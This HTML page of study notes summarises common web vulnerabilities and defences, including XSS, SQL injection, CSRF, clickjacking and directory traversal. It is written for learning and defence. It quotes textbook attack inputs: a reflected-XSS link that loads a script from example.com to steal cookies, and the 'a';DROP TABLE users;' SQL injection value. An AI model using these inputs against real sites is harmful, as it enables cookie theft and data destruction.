<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security</title>
    <style>
      p + p {
        margin-top: 1em;
      }

      .background-code {
        code {
          background-color: #e2e1e1;
        }
      }
    </style>
  </head>
  <body>
    <h1>Security</h1>
    <main>
      <strong
        >The #1 security technique is to never trust data from the browser (URL parameters, POST
        bodies, HTTP headers, cookies, uploaded files, etc.)</strong
      >

      <h2>General Good Practices</h2>
      <section>
        <ul>
          <li>Strong passwords or passkeys & 2FA</li>
          <li>HTTPS, never HTTP</li>
          <li>
            Only store and display sensitive information as necessary (hide passwords and credit
            card numbers, though this only protects from other users physically seeing the
            information)
          </li>
          <li>
            <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools"
              >Vulnerability scanning tools</a
            >
          </li>
        </ul>
      </section>

      <h2>XSS (Cross-Site Scripting)</h2>
      <section>
        <p>
          <strong>Reflected:</strong> user content is returned by the server immediately and
          unmodified. <br />
          Ex: emailing the following link to a user to steal their cookies:
          <code
            >http://developer.mozilla.org?search=beer&lt;script%20src="http://example.com/tricky.js"&gt;&lt;/script&gt;</code
          >
        </p>
        <p>
          <strong>Persistent:</strong> when malicious content is stored by the site and distributed
          to users. <br />
          Ex: a commenting system that supports unmodified HTML, which thus allows users to insert
          scripts.
        </p>

        <p>Always sanitize user inputs and/or disable the markup (maybe via some container)</p>
        <ul>
          <li>from the URL</li>
          <li>from anything that allows submitting text or files that will be rendered</li>
        </ul>
        <p>
          Elements to scrub include <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>,
          <code>&lt;embed&gt;</code>, and <code>&lt;link&gt;</code>.
        </p>
      </section>

      <h2>SQL Injection</h2>
      <section>
        <p>Always santize/escape user-provided inputs into SQL commands.</p>
        <p class="background-code">
          Malicious example:
          <code>statement = "SELECT * FROM users WHERE name = '" + userName + "';"</code> when
          provided with <code>a';DROP TABLE users;</code> becomes
          <code>SELECT * FROM users WHERE name = 'a';DROP TABLE users; </code>
        </p>
      </section>

      <h2>CSRF (Cross-Site Request Forgery)</h2>
      <section>
        <p>
          Cookies are always sent regardless of the referrer, so always use a token (not in cookie
          form) to verify that the request is coming from the user through means that your site
          expects.
        </p>
        <p>
          Ex: Someone creates a page with a hidden script that submits a Venmo
          <code>POST</code> request to send money to their account. Since cookies are sent
          regardless of the referrer, the <code>POST</code> will be successful unless the
          <code>POST</code> requests are protected by CSRF tokens that are generated per
          transaction.
        </p>
      </section>

      <h2>Clickjacking</h2>
      <section>
        <p>
          Always set your CSP (Content Security Policy) headers to avoid your site being served in
          an iframe on malicious sites.
        </p>
        <p>
          This attack allows attackers to overlay their own content invisibly and intercept entered
          information or have you perform actions accidentally, such as clicking a button that
          appears to do one thing but is acutally overlaid with a 1-click order button on Amazon
          loaded in an iframe (if 1-click orders are enabled and your cookies have you signed in).
        </p>
      </section>

      <h2>DDOS (Distributed Denial of Service)</h2>
      <section>
        <p>
          Involved overhleming a web application's bandwidth or a certain application-level
          bottleneck.
        </p>
        <p>
          Some mitigation options are load balancers, rate limiting, and services that specifically
          track for unusual IP traffic.
        </p>
      </section>

      <h2>Directory Traversal</h2>
      <section>
        Occurs when user is able to pass unsanitized file names/paths to server using navigation
        characters like <code>../</code>.
      </section>

      <h2>File Inclusion</h2>
      <section>
        <p>
          Allows for loading an unintended file on the server-side, such as not santiizing when
          allowing a user to specificy a URL/path/anything to be input to code that accepts
          URLs/paths.
        </p>
      </section>

      <h2>Command Injection</h2>
      <section>
        <p>Happens when unsanitized user input can be supplied to a system shell server-side.</p>
      </section>
    </main>
  </body>
</html>
